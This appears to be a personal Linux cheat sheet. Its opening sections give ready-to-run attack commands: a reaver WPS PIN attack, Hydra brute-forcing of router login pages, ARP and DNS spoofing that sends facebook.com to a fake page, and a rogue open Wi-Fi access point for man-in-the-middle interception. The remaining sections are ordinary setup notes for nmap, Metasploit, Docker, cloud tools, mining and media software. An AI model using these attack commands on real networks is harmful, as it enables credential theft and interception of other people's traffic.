sudo airodump-ng --wps wlan1mon
sudo reaver -i wlan1mon -b 00:00:00:00:00:00 -c 44 -f -a -w -vv -K 1



#--------------------------------------------------------------------------------------------------------------------------------
#Using Hydra to recover access point management credentials

sudo hydra http://[192.168.1.1]/login.html -e ns -F -V -t 4 -l username -p password
sudo hydra http://[192.168.1.1]/login.html -e ns -F -V -t 4 -L ./usernames.list -P ./passwords.list



#--------------------------------------------------------------------------------------------------------------------------------
#ARP and DNS spoofing

#Install routing tools, DNS masquaraidig and access point packages
sudo apt-get install bridge-utils dnsmasq hostapd

#Create a spoof DNS hosts file
./spoofhosts.dns
192.168.0.1		www*
192.168.0.1		facebook.com

#Create fake web pages
/var/www/html/fakepage.html

#Start the Apache web server
sudo apache2ctl start

#Enable IP forwarding
sudo echo 1 > /proc/sys/net/ipv4/ip_forward

#Enable firewall
iptables -P FORWARD ACCEPT

#Start ARP spoofing
sudo arpspoof -t 192.168.0.24 192.168.0.1 && sudo arpspoof -t 192.168.0.1 192.168.0.24

#Start DNS spoofing
sudo dnsspoof -f ./spoofhosts.dns host 192.168.0.24 and udp port 53



#--------------------------------------------------------------------------------------------------------------------------------
#Create a MITM fake access point

#Create a DNS masquaraiding configuration
/etc/dnsmasq.conf
interface=at0
dhcp-range=10.0.0.10,10.0.0.110,1h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp

#Create a spoof DNS hosts file
./spoofhosts.dns
192.168.0.1		www*
192.168.0.1		facebook.com

#Start fake access point
sudo airbase-ng -e 'FREEWIFI4ALL' -c 44 wlan1mon

#Start DNS madquaraiding
sudo dnsmasq -C /etc/dnsmasq.conf -H ./spoofhosts.dns -d

#Bring up the fake access point interface
ifconfig at0 10.0.0.1/24 up

#Enable routes
sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

#Enable IP forwarding
sudo echo 1 > /proc/sys/net/ipv4/ip_forward

#Enable firewall
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

#Create fake web pages
/var/www/html/fakepage.html

#Start the Apache web server
sudo apache2ctl start



#--------------------------------------------------------------------------------------------------------------------------------
#Using nmap to scan network

#Save ping scan results to plain text file
sudo nmap -oN pingscan.lst -v 192.168.0.*

#From text list of target hosts, save full port scan results to XML file
sudo nmap -p- -A -iL pingscan.lst -oX scanresults.xml 192.168.0.*

#Traceroute
sudo nmap --traceroute 192.168.0.*

#Operating system discovery and service versions
sudo nmap -O -sV 192.168.0.*



#--------------------------------------------------------------------------------------------------------------------------------
#Wireshark on Ubuntu

#1. Install Wireshark
sudo apt-get install wireshark

#2. Create a wireshark group
sudo groupadd wireshark

#3. Add your username to the wireshark group
sudo usermod -a -G wireshark YOUR_USERNAME

#4. Change the group ownership of the file dumpcap to wireshark
sudo chgrp wireshark /usr/bin/dumpcap

#5. Chage the mode of the file dumpcap to allow execution by the group wireshark
sudo chmod 750 /usr/bin/dumpcap

#6. Grant capabilities with setcap
sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap

#7. Verify the change
sudo getcap /usr/bin/dumpcap

#8. Reboot



#--------------------------------------------------------------------------------------------------------------------------------
#Installing Metasploit

curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && sudo chmod 755 msfinstall && sudo ./msfinstall
  
  
sudo service postgresql start
sudo msfconsole
clear
?
show exploits
search windows
search cve:2010 type:exploit app:client
search win10
search win7
info exploit
use exploit 
show options
set setting value
back
whois target
host FQDN
nmap -F 



curl https://github.com/WebGoat/WebGoat/releases/download/7.1/webgoat-container-7.1-exec.jar > ./webgoat-container-7.1-exec.jar
java -jar ./webgoat-container-7.1-exec.jar -httpPort=8081
http://localhost:8081/WebGoat

dmitry -pb scanme.org
dnsenum scanme.org
nikto -h scanme.org



#--------------------------------------------------------------------------------------------------------------------------------
# Using Kali OpenVAS

sudo apt-get install -y openvas
openvas-setup
#openvasmd --user=admin --new-password=admin
openvas-nvt-sync
openvas-start
firefox https://127.0.0.1:9392



#--------------------------------------------------------------------------------------------------------------------------------
# Using Kali Vega

sudo apt-get install -y vega
vega
proxy: 127.0.0.1:8888



#--------------------------------------------------------------------------------------------------------------------------------
#Using MiniNet

sudo apt-get install kvm libvirt-bin virtinst

#Remove the default libvirt bridge (named virbr0). This ensures that the bridge compatibility portion of OVS can load without any potential conflicts:
sudo virsh net-destroy default
sudo virsh net-autostart --disable default

#aptitude purge ebtables

#MiniNet help
mn -h

#Create various topologies
sudo mn --topo=single,4

sudo mn --topo=linear,2,3

sudo mn --topo=tree,2,2

#Shutdown and cleanup MiniNet
sudo mn -c

#Install Open vSwitch
sudo apt-get install openvswitch-controller openvswitch-brcompat openvswitch-switch openvswitch-datapath-source

#Enable bridge compatibility mode for OVS
sudo nano /etc/default/openvswitch-switch and change this line:

#Find
# #BRCOMPAT=no
#Change it by removing the hash mark (uncommenting it) and specifying yes:
# BRCOMPAT=yes

#Start Open vSwitch
sudo service openvswitch-switch start

#Build and install the necessary module if needed
sudo module-assistant auto-install openvswitch-datapath

#To check KVM, use this command to return a list of running VMs
sudo virsh -c qemu:///system list

#To check Open vSwitch, first use this command to see if the kernel modules loaded properly:
sudo lsmod | grep brcom
#This should return an entry containing brcompat_mod and openvswitch_mod

#To show the running state of Open vSwitch processes
sudo service openvswitch-switch status

sudo ovs-vsctl show 

#create a bridge and add at least one physical interface to allow external communication
ovs-vsctl add-br br0
ovs-vsctl add-port br0 eth0



#--------------------------------------------------------------------------------------------------------------------------------
#Configuring MAME
mame
cd ~/.mame && mame -cc

#The "mame.ini" file will be created in the ~/.mame folder. Edit now this file with this command:

nano ~/.mame/mame.ini

#In "rompath", you can set your own ROM directory path or leave default paths:
#Next, create the following directories in the ~/.mame folder:

mkdir  ~/.mame/nvram memcard roms inp comments sta snap diff

gnome-video-arcade -b



#--------------------------------------------------------------------------------------------------------------------------------
# OpenSSL

openssl req -new -newkey rsa:4096





#--------------------------------------------------------------------------------------------------------------------------------
# CPU mining

git clone https://github.com/tpruvot/cpuminer-multi

cd cpuminer-multi/

./build.sh -j4

./cpuminer -a x16r -o stratum+tcp://pool.threeeyed.info:3333 -u RFGsQiFaySVMjcvKTDxsWu5ftFVpbRsuG3 -p c=RVN -t 2


#--------------------------------------------------------------------------------------------------------------------------------
# GPU mining

sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl libssl-dev libgmp-dev make g++ git libgmp-dev opencl-headers libncurses5-dev libtool ocl-icd-opencl-dev

git clone https://github.com/novaspirit/sgminer

cd sgminer 

git submodule init

git submodule update

autoreconf -i

CFLAG="-O2 -march=native" ./configure --disable-adl

make -j4

#ASIC
git clone https://github.com/ckolivas/cgminer

#GPU
git clone https://github.com/ckolivas/cgminer/tree/3.7

CFLAGS="-O2 -Wall -march=native" ./configure --enable-opencl --enable-scrypt



#--------------------------------------------------------------------------------------------------------------------------------

wordpress

#--------------------------------------------------------------------------------------------------------------------------------

joomla

#--------------------------------------------------------------------------------------------------------------------------------

drupal

#--------------------------------------------------------------------------------------------------------------------------------

snort

#--------------------------------------------------------------------------------------------------------------------------------

surricatta

#--------------------------------------------------------------------------------------------------------------------------------

AlienVault

#--------------------------------------------------------------------------------------------------------------------------------

RazorBack

#--------------------------------------------------------------------------------------------------------------------------------
# CUPS print server

sudo apt-get install cups
sudo usermod -a -G lpadmin pi
sudo cupsctl --remote-any
sudo /etc/init.d/cups restart

sudo apt-get install samba
sudo nano /etc/samba/smb.conf
[printers]
guest ok = yes
[print$]
read only = no

sudo systemctl restart smbd

http://localhost:631/admin

#--------------------------------------------------------------------------------------------------------------------------------

#--------------------------------------------------------------------------------------------------------------------------------

#--------------------------------------------------------------------------------------------------------------------------------
#Create Squid Proxy Server
#These instructions are specific for Ubuntu.

#Install Squid
sudo apt-get install squid3
sudo cp /etc/squid3/squid.conf /etc/squid3/squid.conf.ORIG
sudo chmod a-w /etc/squid3/squid.conf.ORIG
sudo vi /etc/squid3/squid.conf

#By default, Squid listens on port 3128.  If you want to change the port change the http_port directive.

#To allow only a specific range of IPs to connect, edit the ACL section.  For this example, we want to allow the 192.168.42.0 subnetwork access to squid.

#At the bottom of the ACL section, add the line (without the quotes): "acl fortytwo_network src 192.168.42.0/24".

#Add the top of the http_access section, add the line (without the quotes): "http_access allow fortytwo_network"

sudo service squid3 restart
tail -f syslog
#Setup Basic Authentication
#ID	Status	Task

#Setup Digest Authentication
cd /etc/squid3/
sudo touch passwd
apt-get install apache2-utils
sudo chown proxy.proxy passwd
chmod 640 passwd
sudo chmod 640 passwd
sudo htdigest /etc/squid3/passwd <realm name> <username>
sudo cat passwd
/usr/lib/squid3/digest_file_auth -c /etc/squid3/passwd
/usr/lib/squid3/digest_file_auth -c /etc/squid3/passwd "OnlyMe":"OverThere"
/usr/lib/squid3/digest_file_auth -c /etc/squid3/passwd "<username>":"<realm name>"
sudo /usr/lib/squid3/digest_file_auth -c /etc/squid3/passwd
sudo vi /etc/squid3/squid.conf
sudo service squid3 reload

#In the auth_param section, add the following lines:

auth_param digest program /usr/lib/squid3/digest_file_auth -c /etc/squid3/passwd
auth_param digest realm <realm name>
auth_param digest children 2

#In the http_access section, add the following line at the top:

http_access allow auth_users

#In the ACL section, add the following line right before network acle (forttwo_network in the example above):

acl auth_users proxy_auth REQUIRED

#Note: PuTTY only allows the use of Basic authentication when using the proxy setting.  You could consider doing SSH PortForwarding as an alternative.



#--------------------------------------------------------------------------------------------------------------------------------
# Starting Amazon Alexa Echo
# https://developer.amazon.com/avs/home.html#/

# To run the demo, do the following in 3 seperate terminals:

# Run the companion service:
cd /home/pi/alexa-avs-sample-app/samples/companionService && npm start

# Run the AVS Java Client: 
cd /home/pi/alexa-avs-sample-app/samples/javaclient && mvn exec:exec

# Run the wake word agent:
  # Sensory: 
  cd /home/pi/alexa-avs-sample-app/samples/wakeWordAgent/src && ./wakeWordAgent -e sensory
  # KITT_AI: 
  cd /home/pi/alexa-avs-sample-app/samples/wakeWordAgent/src && ./wakeWordAgent -e kitt_ai

  # GPIO: PLEASE NOTE -- If using this option, run the wake word agent as sudo:
  cd /home/pi/alexa-avs-sample-app/samples/wakeWordAgent/src && sudo ./wakeWordAgent -e gpio

#--------------------------------------------------------------------------------------------------------------------------------
# Starting Google Gina Assistant
# https://console.cloud.google.com/cloud-resource-manager

sudo apt-get install python3-dev python3-venv portaudio19-dev libffi-dev libssl-dev

python3 -m venv env

env/bin/python -m pip install pip setuptools

source env/bin/activate

#Downloading libs for google assistant

python -m pip install https://github.com/googlesamples/assistant-sdk-python/releases/download/0.3.1/google_assistant_library-0.0.2-py2.py3-none-linux_armv7l.whl

#oauth tool

python -m pip install google-auth-oauthlib[tool]

#obtaining oauth key. replace idxxx with your client id file

google-oauthlib-tool –client-secrets /home/pi/client_secret_729061024252-itm9ccvgaqleobll1uc1b1oqeikhroi9.apps.googleusercontent.com.json --scope https://www.googleapis.com/auth/assistant-sdk-prototype –-save –-headless

#to run google assistant

google-assistant-demo



# older method
python -m googlesamples.assistant.auth helpers --client-secrets /home/pi/client_secret_501300937746-ol46e5jaiaredjp2np32ekrav97c3pfk.apps.googleusercontent.com.json

# https://myaccount.google.com/activitycontrols

python -m googlesamples.assistant

#--------------------------------------------------------------------------------------------------------------------------------
# Installing Docker

# Docker for Raspberry Pi
curl -sSL https://get.docker.com | sh
sudo usermod -aG docker pi

# Docker for Linux
sudo apt-get install linux-image-extra-$(uname -r) linux-image-extra-virtual
sudo apt-get install docker-ce

# https://docs.docker.com/engine/installation/linux/ubuntu/#install-using-the-repository

# Install packages to allow apt to use a repository over HTTPS:
sudo apt-get install apt-transport-https ca-certificates curl software-properties-common

# Add Docker’s official GPG key:
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -

# Verify that the key fingerprint is 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88.
sudo apt-key fingerprint 0EBFCD88

# Verify that the key fingerprint is DD91 1E99 5A64 A202 E859 07D6 BC14 F10B 6D08 5F96.
apt-key fingerprint 0EBFCD88

# Use the following command to set up the stable repository.
# Note: The lsb_release -cs sub-command below returns the name of your Ubuntu distribution, such as xenial.

# Sometimes, in a distribution like Linux Mint, you might have to change $(lsb_release -cs) to your parent Ubuntu distribution. For example: If you are using Linux Mint Rafaela, you could use trusty.

#To add the edge repository, add edge after stable on the last line of the command. For information about stable and edge builds, see Docker variants.

sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
# or
sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(grep "UBUNTU_CODENAME" /etc/os-release | awk -F '=' '{ print $2 }') stable"
sudo apt-get update

# Install the latest version of Docker, or go to the next step to install a specific version. Any existing installation of Docker is replaced.

# Use this command to install the latest version of Docker:
sudo apt-get install docker-ce

# Warning: If you have multiple Docker repositories enabled, installing or updating without specifying a version in the apt-get install or apt-get update command will always install the highest possible version, which may not be appropriate for your stability needs.

# The contents of the list depend upon which repositories are enabled, and will be specific to your version of Ubuntu (indicated by the xenial suffix on the version, in this example). Choose a specific version to install. The second column is the version string. The third column is the repository name, which indicates which repository the package is from and by extension its stability level. To install a specific version, append the version string to the package name and separate them by an equals sign (=):

# The Docker daemon starts automatically.

# Verify that Docker CE or Docker EE is installed correctly by running images
docker-machine env
eval $("C:\Program Files\Docker Toolbox\docker-machine.exe" env)


sudo docker run -ti --name hello-world hello-world:latest
sudo docker run -ti --name swarm swarm:latest
sudo docker run -ti --name registry registry:latest
sudo docker run -ti --name alpine alpine:latest sh
sudo docker run -ti --name busybox busybox:latest sh
sudo docker run -ti -v /var/run/docker.sock:/var/run/docker.sock --name docker docker:latest sh

sudo docker run -ti --name debian debian:latest bash
sudo docker run -ti --name ubuntu ubuntu:latest bash
sudo docker run -ti --name fedora fedora:latest bash
sudo docker run -ti --name centos centos:latest bash
#sudo docker run -ti --name opensuse opensuse:latest bash
sudo docker run -ti --name mageia mageia:latest bash
sudo docker run -ti --name amazon amazonlinux:latest bash
sudo docker run -ti --name oracle oraclelinux:latest bash
sudo docker run -ti --name jenkins jenkins:latest bash

sudo docker run -ti --name gcc gcc:latest bash
sudo docker run -ti --name golang golang:latest bash
sudo docker run -ti --name python3 python:latest
sudo docker run -ti --name r-base r-base:latest
sudo docker run -ti --name haskell haskell:latest
sudo docker run -ti --name julia julia:latest

sudo docker pull tensorflow/tensorflow                  # Download latest image
sudo docker run -it -p 8888:8888 tensorflow/tensorflow  # Start a Jupyter notebook server 
 
sudo docker run -ti --name azuresdk azuresdk/azure-cli-python:latest
sudo docker run -ti --name gcloudsdk google/cloud-sdk:latest
sudo docker run -ti --name gcloudsdk google/cloud-sdk gcloud init
sudo docker run --rm -ti google/cloud-sdk gcloud info
sudo docker run --rm -ti google/cloud-sdk gcloud components list
sudo docker run --rm -ti google/cloud-sdk gcutil listinstances
sudo docker run --rm -ti google/cloud-sdk gsutil ls


docker pull hashicorp/waypoint:latest


sudo docker run -ti --name nanoserver microsoft/nanoserver:latest
sudo docker run -ti --name coreserver microsoft/windowsservercore:latest
sudo docker run -ti --name powershell microsoft/powershell:latest
sudo docker run -d --name nanoiis -d -it -p 80:80 nanoserver/iis

sudo docker run -d --name redis -p 127.0.0.1:6379:6379 -v "$PWD/data":/data redis:latest
sudo docker run -d --name mysql mysql:latest
sudo docker run -d -p 80:80 --name nginx nginx:latest; curl localhost:80
sudo docker run -d -p 8080:8080 --name webgoat webgoat/webgoat-7.1:latest; curl localhost:8080; lynx http://192.168.99.100:8080/WebGoat/
sudo docker run -d -p 1880:1880 --name nodered nodered/node-red-docker

docker run -d -p 4444:4444 -v /dev/shm:/dev/shm -e GRID_TIMEOUT=30000 -e GRID_MAX_SESSION=5 --name selenium-hub selenium/hub:3.4.0-dysprosium
docker run -d -e NODE_MAX_INSTANCES=5 -e NODE_MAX_SESSION=5 -v /dev/shm:/dev/shm --link selenium-hub:hub selenium/node-chrome:3.4.0-dysprosium
docker-compose scale chrome=15 firefox=15 docker-compose.yml

hub:
	image:selenium/hub
	ports:
		-”4444:4444”
firefox:
	image:selenium/node-firefox
	links:
		-hub
chrome:
	image:selenium/node-chrome
	links:
		-hub


sudo docker commit image-id new-image-name

docker ps -a
docker stop name
docker rm name
docker rmi name



# This command downloads a test image and runs it in a container. When the container runs, it prints an informational message and exits.

# Docker is installed and running. You need to use sudo to run Docker commands. Continue to Linux postinstall to allow non-privileged users to run Docker commands and for other optional configuration steps.


UPGRADE DOCKER

To upgrade Docker, first run sudo apt-get update, then follow the installation instructions, choosing the new version you want to install.
Install from a package

If you cannot use Docker’s repository to install Docker, you can download the .deb file for your release and install it manually. You will need to download a new file each time you want to upgrade Docker.
This step is different for Docker CE and Docker EE.
Docker CE: Go to https://download.docker.com/linux/ubuntu/pool/stable-17.03/amd64/ and download the .deb file for the Docker version you want to install and for your version of Ubuntu.
Note: To install an edge package, change the word stable in the > URL to edge. For information about stable and edge builds, see Docker variants.
Docker EE: Go to the Docker EE repository URL associated with your trial or subscription in your browser. Go to x86_64/stable and download the .rpm file for the Docker version you want to install.
Install Docker, changing the path below to the path where you downloaded the Docker package.
$ sudo dpkg -i /path/to/package.deb
The Docker daemon starts automatically.
Verify that Docker CE or Docker EE is installed correctly by running the hello-world image.
$ sudo docker run hello-world
This command downloads a test image and runs it in a container. When the container runs, it prints an informational message and exits.
Docker is installed and running. You need to use sudo to run Docker commands. Continue to Post-installation steps for Linux to allow non-privileged users to run Docker commands and for other optional configuration steps.
UPGRADE DOCKER

To upgrade Docker, download the newer package file and repeat the installation procedure, pointing to the new file.
Uninstall Docker
Uninstall the Docker package:
Docker Edition	Command
Docker CE	sudo apt-get purge docker-ce
Docker EE	sudo apt-get purge docker-ee
Images, containers, volumes, or customized configuration files on your host are not automatically removed. To delete all images, containers, and volumes:
$ sudo rm -rf /var/lib/docker
You must delete any edited configuration files manually.

#--------------------------------------------------------------------------------------------------------------------------------
# Installing Vagrant

wget https://releases.hashicorp.com/vagrant/2.0.0/vagrant_2.0.0_x86_64.deb -O vagrant_2.0.0_x86_64.deb &&  sudo dpkg -i vagrant_2.0.0_x86_64.deb

vagrant plugin repair





#--------------------------------------------------------------------------------------------------------------------------------
# Open Management Infrastructure - PowerShell - DSC for Linux

wget https://github.com/Microsoft/omi/releases/download/v1.1.0-0/omi-1.1.0.ssl_100.x64.deb
sudo dpkg -i omi-1.1.0.ssl_100.x64.deb

wget https://github.com/PowerShell/PowerShell/releases/download/v6.0.0-alpha.17/powershell_6.0.0-alpha.17-1ubuntu1.16.04.1_amd64.deb
sudo dpkg -i powershell_6.0.0-alpha.17-1ubuntu1.16.04.1_amd64.deb

# Windows PowerShell Desired State Configuration for Linux source
wget https://github.com/Microsoft/PowerShell-DSC-for-Linux/releases/download/v1.1.1-294/dsc-1.1.1-294.ssl_100.x64.deb
sudo dpkg -i dsc-1.1.1-294.ssl_100.x64.deb

sudo add-apt-repository  "deb http://archive.ubuntu.com/ubuntu/ xenial-proposed restricted main multiverse universe"

sudo apt-get install git pkg-config make g++ rpm librpm-dev libpam0g-dev libssl-dev libkrb5-dev libgssapi-krb5-2 gss-ntlmssp

git clone --recursive git@github.com:Microsoft/ostc-openssl.git

cd openssl-1.0.0

#To configure and build SSL 1.0.0, use the following commands:

./config --prefix=/usr/local_ssl_1.0.0 shared -no-ssl2 -no-ec -no-ec2m -no-ecdh
make depend
make
make test
sudo make install_sw

OMI_USER=omi_test
OMI_PASSWORD=`xxxxx
`
export OMI_USER
export OMI_PASSWORD

git clone --recursive git@github.com:Microsoft/Build-omi.git bld-omi

cd bld-omi
git checkout master
git submodule foreach git checkout master

cd bld-omi
pushd bld-omi/omi/Unix
./configure --dev
make -j
popd

# Run regression tests

pushd bld-omi/omi/Unix
./regress
popd
Building Release Agents

# From the bld-omi directory (created above from 'git clone', do the following:

cd omi/Unix
./configure
make

./configure --enable-ulinux

./configure --enable-microsoft



#--------------------------------------------------------------------------------------------------------------------------------
# Configuring Google Cloud Platform

# Create an environment variable for the correct distribution:
export CLOUD_SDK_REPO="cloud-sdk-$(grep "UBUNTU_CODENAME" /etc/os-release | awk -F '=' '{ print $2 }')"

# Add the Cloud SDK distribution URI as a package source:
echo "deb https://packages.cloud.google.com/apt $CLOUD_SDK_REPO main" | sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list

# Import the Google Cloud public key:
curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -

# Update and install the Cloud SDK:
sudo apt-get update && sudo apt-get install google-cloud-sdk google-cloud-sdk-app-engine-python google-cloud-sdk-app-engine-java google-cloud-sdk-datalab google-cloud-sdk-datastore-emulator google-cloud-sdk-pubsub-emulator google-cloud-sdk-bigtable-emulator kubectl

# Run gcloud init to get started:
gcloud init

pip3 install datalab gcloud 

gcloud components install kubectl




#--------------------------------------------------------------------------------------------------------------------------------
# Configuring Amazon Web Services

aws configure

aws ec2 describe-instances --region eu-north-1

aws ec2 run-instances --image-id region image id --instance-type t2.micro --region eu-north-1

aws --region eu-north-1 cloudformation validate-template --template-body file://./template.yml

aws --region eu-north-1 cloudformation create-stack --stack-name ec2stack --parameters file://./template.json --template-body file://./template.yml

aws --region eu-north-1 cloudformation update-stack --stack-name ec2stack --parameters file://./template.json --template-body file://./template.yml





#--------------------------------------------------------------------------------------------------------------------------------
# PowerShell 7.0 on Linux

# Import the public repository GPG keys
curl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -

# Register the Microsoft Ubuntu repository
curl https://packages.microsoft.com/config/ubuntu/16.04/prod.list | sudo tee /etc/apt/sources.list.d/microsoft.list

# Update apt-get
sudo apt-get update

# Install PowerShell
sudo apt-get install -y powershell

# Start PowerShell
powershell
pwsh



#--------------------------------------------------------------------------------------------------------------------------------
# Microsoft Azure CLI
# https://docs.microsoft.com/en-gb/cli/azure/install-azure-cli

sudo apt-get update && sudo apt-get install -y libssl-dev libffi-dev python-dev build-essential nodejs npm
sudo npm install -g azure-cli

# 32-bit system
echo "deb https://packages.microsoft.com/repos/azure-cli/ jessie main" | \
     sudo tee /etc/apt/sources.list.d/azure-cli.list

# 64-bit system
echo "deb [arch=amd64] https://packages.microsoft.com/repos/azure-cli/ wheezy main" | sudo tee /etc/apt/sources.list.d/azure-cli.list

sudo apt-key adv --keyserver packages.microsoft.com --recv-keys 417A0893
sudo apt-get install apt-transport-https
sudo apt-get update && sudo apt-get install nodejs npm azure-cli


#--------------------------------------------------------------------------------------------------------------------------------
# Kodi

If you are not up to date use this FIRST

 sudo apt-get update
 
 sudo apt-get upgrade

1. echo 'deb http://pipplware.pplware.pt/pipplware/dists/jessie/main/binary /' | sudo tee --append /etc/apt/sources.list.d/pipplware_jessie.list

2. wget -O - http://pipplware.pplware.pt/pipplware/key.asc | sudo apt-key add -

3. sudo apt-get update

4. sudo apt-get install kodi


 optional update Kodi to latest version provided by the repo

   sudo apt-get upgrade
   sudo apt-get dist-upgrade




To get and install kodi 15.1 for Raspbian, run the following from a terminal or the command line:

wget http://steinerdatenbank.de/software/kodi-15.tar.gz
tar -xzf kodi-15.tar.gz
cd kodi-15
sudo ./install





To get and install kodi 15.2RC3 for Jessie, run the following from a terminal or the command line:

wget http://steinerdatenbank.de/software/kodi-15-jessie.tar.gz
tar -xzf kodi-15-jessie.tar.gz
cd kodi-15-jessie
sudo ./install



#--------------------------------------------------------------------------------------------------------------------------------
# Netflix Hulu

 sudo apt-get update
 
 sudo apt-get upgrade

 wget https://github.com/kusti8/chromium-build/releases/download/netflix-1.0.0/chromium-browser_56.0.2924.84-0ubuntu0.14.04.1.1011.deb

 sudo dpkg -i chromium-browser_56.0.2924.84-0ubuntu0.14.04.1.1011.deb
 
#--------------------------------------------------------------------------------------------------------------------------------
# Install OpenStack

apt install software-properties-common
add-apt-repository cloud-archive:newton
apt install python-openstackclient


#--------------------------------------------------------------------------------------------------------------------------------
# Robot Operating System   https://wiki.ros.org/ROS/Tutorials

sudo sh -c 'echo "deb http://packages.ros.org/ros/ubuntu $(lsb_release -sc) main" > /etc/apt/sources.list.d/ros-latest.list'
sudo apt-key adv --keyserver 'hkp://keyserver.ubuntu.com:80' --recv-key C1CF6E31E6BADE8868B172B4F42ED6FBAB17C654
sudo apt update
sudo apt install ros-melodic-desktop-full

apt search ros-melodic

echo "source /opt/ros/melodic/setup.bash" >> ~/.bashrc
source ~/.bashrc

sudo rosdep init
rosdep update

sudo apt install python-rosinstall python-rosinstall-generator python-wstool build-essential



#--------------------------------------------------------------------------------------------------------------------------------

wget -q "http://packages.medibuntu.org/medibuntu-key.gpg" -O- | sudo apt-key add -
sudo add-apt-repository "deb http://packages.medibuntu.org/ $(lsb_release -sc) free non-free"
sudo apt-get update && sudo apt-get install w32codecs w64codecs libdvdcss2

#--------------------------------------------------------------------------------------------------------------------------------
# Brave browser

sudo apt install apt-transport-https curl

curl -s https://brave-browser-apt-release.s3.brave.com/brave-core.asc | sudo apt-key --keyring /etc/apt/trusted.gpg.d/brave-browser-release.gpg add -

echo "deb [arch=amd64] https://brave-browser-apt-release.s3.brave.com/ stable main" | sudo tee /etc/apt/sources.list.d/brave-browser-release.list

sudo apt update

sudo apt install brave-browser

